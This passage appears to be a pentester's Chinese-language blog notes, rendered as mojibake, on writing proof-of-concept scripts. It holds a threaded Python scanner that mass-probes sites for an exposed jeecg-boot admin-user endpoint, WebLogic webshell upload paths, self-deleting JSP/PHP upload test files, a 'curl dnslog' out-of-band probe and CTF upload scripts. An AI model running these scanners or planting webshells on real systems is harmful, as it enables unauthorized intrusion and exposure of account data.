class="line">CVE-2019-2888ï¼šå…ˆèµ·ä¸€ä¸ªæ¶æ„çš„xxeæœåŠ¡ï¼Œå†ç”¨expæ‰“</span><br></pre></td></tr></table></figure></li></ul><h2 id="Webè·¯å¾„"><a href="#Webè·¯å¾„" class="headerlink" title="Webè·¯å¾„"></a>Webè·¯å¾„</h2><p><a href="https://chaserw.github.io/2021/11/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84weblogic%E4%B8%8A%E4%BC%A0webshell/">è®°ä¸€æ¬¡æ›²æŠ˜çš„weblogicä¸Šä¼ webshell | chaserâ€™s Blog (chaserw.github.io)</a></p><p>å‡è®¾ä¸Šä¼ çš„jspä¸º<code>shell.jsp</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç‰©ç†è·¯å¾„</span></span><br><span class="line">/Oracle/Middleware/wlserver_10.3/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp</span><br><span class="line"><span class="comment"># è®¿é—®è·¯å¾„</span></span><br><span class="line">https://xx.com/console/framework/skins/wlsconsole/images/shell.jsp</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç‰©ç†è·¯å¾„</span></span><br><span class="line">/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/éšæœºå­—ç¬¦/war/shell.jsp</span><br><span class="line"><span class="comment"># è®¿é—®è·¯å¾„</span></span><br><span class="line">https://xx.com/bea_wls_internal/shell.jsp</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç‰©ç†è·¯å¾„</span></span><br><span class="line">/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/éšæœºå­—ç¬¦/war/shell.jsp</span><br><span class="line"><span class="comment"># è®¿é—®è·¯å¾„</span></span><br><span class="line">https://xx.com/uddiexplorer/shell.jsp</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç‰©ç†è·¯å¾„</span></span><br><span class="line">/Oracle/Middleware/user_projects/domains/application/servers/AdminServer/tmp/_WL_user/é¡¹ç›®å/éšæœºå­—ç¬¦/war/shell.jsp</span><br><span class="line"><span class="comment"># è®¿é—®è·¯å¾„</span></span><br><span class="line">https://xx.com/é¡¹ç›®å/shell.jsp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>POCç¼–å†™</title>
      <link href="/2023/05/01/python%E8%84%9A%E6%9C%AC/"/>
      <url>/2023/05/01/python%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="å•ä¸ªPOCæ¨¡æ¿"><a href="#å•ä¸ªPOCæ¨¡æ¿" class="headerlink" title="å•ä¸ªPOCæ¨¡æ¿"></a>å•ä¸ªPOCæ¨¡æ¿</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> response</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">from</span> weakref <span class="keyword">import</span> proxy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> init</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore</span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">POC</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.banner()</span><br><span class="line">        self.args = self.parseArgs()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.args.file:</span><br><span class="line">            self.init()</span><br><span class="line">            self.urlList = self.loadURL()  </span><br><span class="line">            self.multiRun()</span><br><span class="line">            self.start = time.time()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.verfyurl()  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">banner</span>(<span class="params">self</span>):</span><br><span class="line">        logo = <span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                                     .__          </span></span><br><span class="line"><span class="string">  ____ ___  ________    _____ ______ |  |   ____  </span></span><br><span class="line"><span class="string">_/ __ \\  \/  /\__  \  /     \\____ \|  | _/ __ \ </span></span><br><span class="line"><span class="string">\  ___/ &gt;    &lt;  / __ \|  Y Y  \  |_&gt; &gt;  |_\  ___/ </span></span><br><span class="line"><span class="string"> \___  &gt;__/\_ \(____  /__|_|  /   __/|____/\___  &gt;</span></span><br><span class="line"><span class="string">     \/      \/     \/      \/|__|             \/                                                                                                  </span></span><br><span class="line"><span class="string">                                            authorï¼š Khaz</span></span><br><span class="line"><span class="string">                                            GitHubï¼š https://github.com/Khaz</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[91m&quot;</span> + logo + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parseArgs</span>(<span class="params">self</span>):</span><br><span class="line">        date = time.strftime(<span class="string">&quot;%Y-%m-%d_%H-%M-%S&quot;</span>, time.localtime())</span><br><span class="line">        parser = ArgumentParser()</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Target url(e.g. http://127.0.0.1)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">f&quot;Target file(e.g. url.txt)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--thread&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5</span>, <span class="built_in">help</span>=<span class="string">f&quot;Number of thread (default 5)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-T&quot;</span>, <span class="string">&quot;--timeout&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">3</span>,  <span class="built_in">help</span>=<span class="string">&quot;Request timeout (default 3)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=date,  <span class="built_in">help</span>=<span class="string">f&quot;Vuln url output file (e.g. result.txt)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--proxy&quot;</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Request Proxy (e.g http://127.0.0.1:8080)&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proxy_server</span>(<span class="params">self</span>):</span><br><span class="line">        proxy = self.args.proxy</span><br><span class="line">        <span class="keyword">return</span> proxy</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–è„šæœ¬é…ç½®</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nthread:&quot;</span>, self.args.thread)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;timeout:&quot;</span>, self.args.timeout)</span><br><span class="line">        msg = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(self.args.file):</span><br><span class="line">            msg += <span class="string">&quot;Load url file successfully\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">f&quot;\033[31mLoad url file <span class="subst">&#123;self.args.file&#125;</span> failed\033[0m\n&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;failed&quot;</span> <span class="keyword">in</span> msg:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Init failed, Please check the environment.&quot;</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Init successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¿”å›pocçš„è¿”å›åŒ…</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">respose</span>(<span class="params">self, url</span>):</span><br><span class="line">        proxy = self.args.proxy</span><br><span class="line">        proxies = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> proxy:</span><br><span class="line">            proxies = &#123;<span class="string">&quot;http&quot;</span>: proxy, <span class="string">&quot;https&quot;</span>: proxy&#125;</span><br><span class="line">        path = <span class="string">&quot;/jeecg-boot/sys/user/querySysUser?username=admin&quot;</span></span><br><span class="line">        url = urljoin(url, path)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>,        </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url, headers=headers, proxies=proxies, timeout=self.args.timeout, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)           </span><br><span class="line">            resp = response.text</span><br><span class="line">            <span class="keyword">return</span> resp               </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;conn&quot;</span>  </span><br><span class="line">        </span><br><span class="line">    <span class="comment"># å•æ¡urlæ£€æµ‹</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verfyurl</span>(<span class="params">self</span>):</span><br><span class="line">        url = self.args.url</span><br><span class="line">        repData = self.respose(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\&quot;username\&quot;:\&quot;admin\&quot;&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">            <span class="built_in">print</span>(Fore.GREEN +<span class="string">&quot;[+] æ¼æ´å­˜åœ¨ï¼ï¼ï¼[+] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url))        </span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;conn&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] URLè¿æ¥å¤±è´¥ï¼ [-] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[x] æœªæ£€æµ‹åˆ°æ¼æ´ï¼[x] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¤šæ¡urlæ£€æµ‹</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, url</span>):</span><br><span class="line">            repData = self.respose(url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;\&quot;username\&quot;:\&quot;admin\&quot;&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">                msg = Fore.GREEN +<span class="string">&quot;[+] æ¼æ´å­˜åœ¨ï¼ï¼ï¼[+] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">                self.lock.acquire()</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.findCount +=<span class="number">1</span></span><br><span class="line">                    self.vulnRULList.append(url)</span><br><span class="line">                <span class="keyword">finally</span>:</span><br><span class="line">                    self.lock.release()</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;conn&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">                msg = <span class="string">&quot;[-] URLè¿æ¥å¤±è´¥ï¼ [-] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                msg = <span class="string">&quot;[x] æœªæ£€æµ‹åˆ°æ¼æ´ï¼[x] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">            self.lock.acquire()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(msg)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                self.lock.release()</span><br><span class="line">       </span><br><span class="line">    <span class="comment"># å¯¼å…¥æ–‡ä»¶ä¸­çš„url</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loadURL</span>(<span class="params">self</span>):</span><br><span class="line">        urlList = []</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.args.file, encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> u <span class="keyword">in</span> f.readlines():</span><br><span class="line">                u = u.strip()</span><br><span class="line">                urlList.append(u)</span><br><span class="line">        <span class="keyword">return</span> urlList</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å¤šçº¿ç¨‹</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">multiRun</span>(<span class="params">self</span>):</span><br><span class="line">        self.findCount = <span class="number">0</span></span><br><span class="line">        self.vulnRULList = []</span><br><span class="line">        self.lock = Lock()</span><br><span class="line">        executor = ThreadPoolExecutor(max_workers=self.args.thread)</span><br><span class="line">        <span class="keyword">if</span> self.args.url:</span><br><span class="line">            executor.<span class="built_in">map</span>(self.verify, self.url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            executor.<span class="built_in">map</span>(self.verify, self.urlList)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¿å­˜ç»“æœ</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(<span class="string">r&quot;./output&quot;</span>):</span><br><span class="line">            os.mkdir(<span class="string">r&quot;./output&quot;</span>)</span><br><span class="line">        self.outputFile = <span class="string">f&quot;./output/<span class="subst">&#123;self.args.output&#125;</span>.txt&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.outputFile, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> self.vulnRULList:</span><br><span class="line">                f.write(url + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç»“æœç»Ÿè®¡è¾“å‡º</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\nAlltCountï¼š\033[31m%d\033[0m\nVulnCountï¼š\033[32m%d\033[0m&quot;</span> % (<span class="built_in">len</span>(self.urlList), self.findCount))</span><br><span class="line">            self.end = time.time()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Time Spent: %.2f&quot;</span> % (self.end - self.start))</span><br><span class="line">            self.output()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">20</span>, <span class="string">f&quot;\nThe vulnURL has been saved in <span class="subst">&#123;self.outputFile&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    POC()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶ä¸Šä¼ poc"><a href="#æ–‡ä»¶ä¸Šä¼ poc" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ poc"></a>æ–‡ä»¶ä¸Šä¼ poc</h2><ul><li><p>JSP</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(<span class="string">&quot;M2NiYmJmOGJkNjU4MGMyMDBhZTRhYTc2YjliZWIxZjM=&quot;</span>)));<span class="keyword">new</span> <span class="title class_">java</span>.io.File(application.getRealPath(request.getServletPath())).delete();%&gt;</span><br></pre></td></tr></table></figure><blockquote><p>é€šè¿‡è°ƒç”¨<code>application.getRealPath(request.getServletPath())</code>æ¥è·å–å½“å‰è¯·æ±‚çš„Servletè·¯å¾„ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºçœŸå®çš„æ–‡ä»¶è·¯å¾„ã€‚ç„¶åï¼Œä½¿ç”¨<code>new File()</code>æ¥åˆ›å»ºä¸€ä¸ªè¡¨ç¤ºè¯¥æ–‡ä»¶çš„Fileå¯¹è±¡ï¼Œå¹¶è°ƒç”¨<code>.delete()</code>æ–¹æ³•æ¥åˆ é™¤è¯¥æ–‡ä»¶ã€‚</p></blockquote></li><li><p>PHP</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;M2NiYmJmOGJkNjU4MGMyMDBhZTRhYTc2YjliZWIxZjM=&quot;</span>);<span class="variable">$file_path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];<span class="title function_ invoke__">unlink</span>(<span class="variable">$file_path</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="å‘½ä»¤æ‰§è¡ŒPOC"><a href="#å‘½ä»¤æ‰§è¡ŒPOC" class="headerlink" title="å‘½ä»¤æ‰§è¡ŒPOC"></a>å‘½ä»¤æ‰§è¡ŒPOC</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((8#77777)) # æœ‰å›æ˜¾æ£€æµ‹32767</span><br><span class="line">curl dnslog # èƒ½å‡ºç½‘æ£€æµ‹dnslog</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p>å‡è®¾ä¸Šä¼ æ–‡ä»¶çš„è¡¨å•å¦‚ä¸‹</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">multiple</span>=<span class="string">&quot;true&quot;</span> <span class="attr">required</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>å¯¹åº”è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://e1c9d16a-1928-4d06-8480-e770e3b7a0a8.node4.buuoj.cn:81&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123; name : (æ–‡ä»¶å,æ–‡ä»¶å†…å®¹ï¼Œæ–‡ä»¶MIME)  &#125;  å°†æ–‡ä»¶ä¿¡æ¯å¡«å…¥å…ƒç»„ï¼ˆï¼‰ä¸­ï¼Œåªæœ‰æ–‡ä»¶å†…å®¹æ˜¯å¿…é€‰çš„ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¼ æœ¬åœ°æ–‡ä»¶</span></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;sess&quot;</span>, <span class="built_in">open</span>(<span class="string">&#x27;D:\phpstudy_pro\phpstudy_pro\Extensions/tmp/tmp/sess_t6c3cbbvj9p0k6njfkso5kmddr&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›´æ¥ä¸Šä¼ æ–‡ä»¶å†…å®¹å­—ç¬¦ä¸²ï¼ˆæ³¨æ„è¦ç”¨äºŒè¿›åˆ¶ï¼‰</span></span><br><span class="line"><span class="comment"># files = &#123;&quot;file&quot;: (&quot;sess&quot;, b&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;)&#125; </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;direction&#x27;</span>:<span class="string">&#x27;upload&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;attr&#x27;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, data=data ,files=files)</span><br></pre></td></tr></table></figure><h2 id="é…åˆburpæŠ“åŒ…"><a href="#é…åˆburpæŠ“åŒ…" class="headerlink" title="é…åˆburpæŠ“åŒ…"></a>é…åˆburpæŠ“åŒ…</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pro = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># verify=Falseä¸é‰´åˆ«burpçš„sslè¯ä¹¦ï¼Œå¦åˆ™æ— æ³•ä»£ç†https</span></span><br><span class="line">requests.get(url=url,proxies=pro, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h2 id="è„šæœ¬å‚æ•°"><a href="#è„šæœ¬å‚æ•°" class="headerlink" title="è„šæœ¬å‚æ•°"></a>è„šæœ¬å‚æ•°</h2><p><img src="E:/blog/source/images/image-20230810184821837.png" alt="image-20230810184821837"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python xx.py aa</span><br><span class="line"></span><br><span class="line">sys.argv[<span class="number">0</span>]â†’xx.py</span><br><span class="line">sys.argv[<span class="number">1</span>]â†’aa</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;target url&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--threads&quot;</span> , <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;threads num&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">&gt;&gt;</span><br><span class="line">python xx.py -u xx.com -t <span class="number">20</span></span><br><span class="line"></span><br><span class="line">args.url=xx.com</span><br><span class="line">args.threads=<span class="number">20</span></span><br></pre></td></tr></table></figure><h2 id="å¤šçº¿ç¨‹"><a href="#å¤šçº¿ç¨‹" class="headerlink" title="å¤šçº¿ç¨‹"></a>å¤šçº¿ç¨‹</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"></span><br><span class="line">f= <span class="built_in">open</span>(<span class="string">&#x27;./host.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">url</span>):</span><br><span class="line">    res = requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">        f.write(url+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    urls=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">500</span>):</span><br><span class="line">        urls.append(<span class="string">&#x27;http://192-168-1-&#123;&#125;.pvp2039.bugku.cn&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">50</span>) <span class="keyword">as</span> pool:</span><br><span class="line">        <span class="comment"># æäº¤ä»»åŠ¡</span></span><br><span class="line">        futures = [pool.submit(get,url) <span class="keyword">for</span> url <span class="keyword">in</span> urls]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆ</span></span><br><span class="line">        <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">            result = future.result()</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®æœ€å¤§å¹¶å‘æ•°é‡ä¸º20</span></span><br><span class="line">max_concurrent = threading.BoundedSemaphore(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;çº¿ç¨‹æ‰§è¡Œçš„å‡½æ•°&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> max_concurrent:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url, verify=<span class="literal">False</span>, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># åˆ›å»ºå¹¶å¯åŠ¨çº¿ç¨‹</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> f:</span><br><span class="line">            url = url.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            thread = threading.Thread(target=worker, args=(url,))</span><br><span class="line">            thread.start()</span><br><span class="line">            threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç­‰å¾…æ‰€æœ‰çº¿ç¨‹ç»“æŸ</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure><h2 id="å…³é—­sslå‘Šè­¦"><a href="#å…³é—­sslå‘Šè­¦" class="headerlink" title="å…³é—­sslå‘Šè­¦"></a>å…³é—­sslå‘Šè­¦</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¦ç”¨è­¦å‘Š</span></span><br><span class="line">warnings.simplefilter(<span class="string">&#x27;ignore&#x27;</span>, category=InsecureRequestWarning)</span><br></pre></td></tr></table></figure><h2 id="é¢œè‰²å˜åŒ–"><a href="#é¢œè‰²å˜åŒ–" class="headerlink" title="é¢œè‰²å˜åŒ–"></a>é¢œè‰²å˜åŒ–</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> init</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore</span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Fore.GREEN + <span class="string">f&quot;[+]<span class="subst">&#123;url&#125;</span>å­˜åœ¨æ¼æ´ï¼ï¼ï¼ï¼&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŠ è½½ä¸è§£ç JSONæ•°æ®ï¼š</span><br><span class="line"></span><br><span 